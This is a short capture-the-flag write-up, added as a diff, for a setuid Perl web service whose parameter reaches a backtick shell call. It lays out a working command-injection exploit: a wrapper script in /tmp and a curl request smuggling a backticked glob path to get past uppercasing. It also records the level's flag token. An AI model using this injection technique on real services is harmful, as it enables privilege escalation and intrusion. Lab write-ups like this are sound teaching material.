@@ -1,0 +1,33 @@
+Level 12:
+
+- File: level12.pl
+- Language: Perl script
+- Permissions: -rwsr-sr-x+ 1 flag12 level12
+- Behavior: Web server on port 4646 that takes GET parameters `x` and `y`
+
+Analysis:
+- Reads parameter `x` and stores it in `$xx`
+- Applies uppercase: $xx =~ tr/a-z/A-Z/;
+- Strips spaces: $xx =~ s/\s.*//;
+- Uses backticks: @output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+Vulnerability:
+- The backtick (`) executes shell commands
+- This allows code execution with flag12 privileges
+- Since $xx is uppercased, direct `getflag` fails → must work around casing
+
+Exploit Strategy:
+1. Created a wrapper script:
+   echo '#!/bin/bash' > /tmp/GETFLAG
+   echo 'getflag > /tmp/pwned' >> /tmp/GETFLAG
+   chmod +x /tmp/GETFLAG
+
+2. Launched with:
+   curl 'http://127.0.0.1:4646/?x=`/*/GETFLAG`&y=a'
+
+   - `/tmp/GETFLAG` is matched by `/*/GETFLAG`
+   - Shell executes it before `egrep` runs
+   - Writes the flag into /tmp/pwned
+
+Result:
+- Flag Token : g1qKMiRpXf53AWhDaU7FEkczr > level13
